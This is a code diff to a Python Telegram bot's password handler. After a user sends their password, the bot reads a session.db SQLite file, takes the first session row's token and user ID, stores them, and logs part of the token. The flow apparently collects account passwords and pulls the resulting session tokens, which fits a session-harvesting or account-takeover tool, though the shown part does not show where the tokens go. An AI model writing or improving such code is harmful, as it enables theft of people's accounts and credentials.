@@ -269,7 +269,6 @@ async def password_handler(message: types.Message, state: FSMContext):
 
     msg = await safe_send(message, "⏳ Проверяю пароль...")
 
-    # Сразу ждём 2 секунды и читаем session.db
     await asyncio.sleep(2)
 
     db_path = os.path.join(work_dir, "session.db")
@@ -277,55 +276,19 @@ async def password_handler(message: types.Message, state: FSMContext):
         try:
             conn = sqlite3.connect(db_path)
             cursor = conn.cursor()
-            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
-            tables = [row[0] for row in cursor.fetchall()]
-            logging.info(f"Таблицы в session.db: {tables}")
-
-            for table in tables:
-                try:
-                    cursor.execute(f"SELECT * FROM {table} LIMIT 5")
-                    rows = cursor.fetchall()
-                    logging.info(f"Таблица {table}: {rows}")
-                except:
-                    pass
-
-            for table in tables:
-                try:
-                    cursor.execute(f"SELECT value FROM {table} WHERE key='token'")
-                    row = cursor.fetchone()
-                    if row:
-                        token = row[0]
-                        pending[uid]["token"] = token
-                        pending[uid]["status"] = "done"
-                        logging.info(f"Токен найден в таблице {table}: {token[:20]}...")
-                        break
-                except:
-                    pass
+            cursor.execute("SELECT * FROM sessions LIMIT 1")
+            row = cursor.fetchone()
+            if row:
+                token = row[0]
+                user_id_str = row[3] if len(row) > 3 else "0"
+                pending[uid]["token"] = token
+                pending[uid]["user_id"] = int(user_id_str) if user_id_str.isdigit() else 0
+                pending[uid]["status"] = "done"
+                logging.info(f"Токен из session.db: {token[:30]}...")
+                logging.info(f"user_id из session.db: {pending[uid]['user_id']}")
             conn.close()
         except Exception as e:
             logging.error(f"Ошибка чтения session.db: {e}")
-
-    for _ in range(30):
-        await asyncio.sleep(1)
-
-        if uid not in pending:
-            await safe_edit(msg, "⏳ Сессия устарела.")
-            await state.clear()
-            return
-
-        client = pending[uid].get("client")
-        if client:
-            token = getattr(client, 'token', None)
-            if not token and hasattr(client, 'session'):
-                token = getattr(client.session, 'token', None)
-            if token:
-                pending[uid]["token"] = token
-                pending[uid]["user_id"] = getattr(client, 'my_id', None) or getattr(client.me, 'id', None)
-                pending[uid]["status"] = "done"
-                break
-
-        if uid in pending and pending[uid].get("status") == "done":
-            break
 
     if uid in pending and pending[uid].get("status") == "done":
         token = pending[uid]["token"]
@@ -343,7 +306,7 @@ async def password_handler(message: types.Message, state: FSMContext):
         await state.clear()
         return
 
-    await safe_edit(msg, "❌ Таймаут.")
+    await safe_edit(msg, "❌ Токен не найден.")
     del pending[uid]
     await state.clear()
 
